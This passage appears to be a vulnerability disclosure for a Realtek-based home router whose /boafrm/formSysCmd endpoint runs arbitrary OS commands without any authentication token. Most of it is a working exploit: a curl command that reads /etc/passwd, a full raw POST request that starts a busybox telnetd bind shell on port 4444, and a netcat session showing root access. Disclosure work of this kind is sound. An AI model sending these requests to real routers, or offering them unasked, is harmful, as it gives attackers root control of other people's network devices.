Also vulnerabilities is more dangerous when router uses remote management function through the public-facing IP address on the WAN port. Attackers can send prepared POST request to device during administrator session is active and also got rce, because in request doesn't requires any authenticated token or cookies.
An attacker can use this functionality to execute arbitrary OS commandson the router. There is also possibility to get shell command with root priviledge on device.
 Administrator must login to administrator panel and go to  Advanced Setup-> System->Run Command. There is possibility to run ping and traceroute but it is also possible to change it and run different os command. Or Attacker need to send the request to router during admin session.  If You like to use curl:- Send command:curl -d "submit-url=%2Fsyscmd.htm&sysCmd=cat+/etc/passwd" -X POST http://192.168.1.1/boafrm/formSysCmd- Get response:curl http://192.168.1.1/syscmd.htm...root:x:0:0:root:/:/bin/shnobody:x:0:0:nobody:/:/dev/null...
 On router is busybox module so if run command to get bind shell on port 4444: '/bin/busybox telnetd -l/bin/sh -p4444'  ----------------------------------------------------------------------------POST /boafrm/formSysCmd HTTP/1.1Host: 192.168.1.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 44Connection: closeUpgrade-Insecure-Requests: 1
submit-url=%2Fsyscmd.htm&sysCmd=/bin/busybox+telnetd+-l/bin/sh+-p4444-----------------------------------------------------------------------------
Will get open port 4444 which is listening for connections.  So when connect to this port using nc will get a shell with  root priviledge on router.------------------------------# nc 192.168.1.1 4444��echo $USERecho $USERroot# cat /proc/versioncat /proc/versionLinux version 3.10.90 (admin@hasee1.hopeiot) (gcc version 4.4.7 (Realtek MSDK-4.4.7 Build 2001) ) #2201 Wed Aug 14 10:38:28 CST 2019# ------------------------------
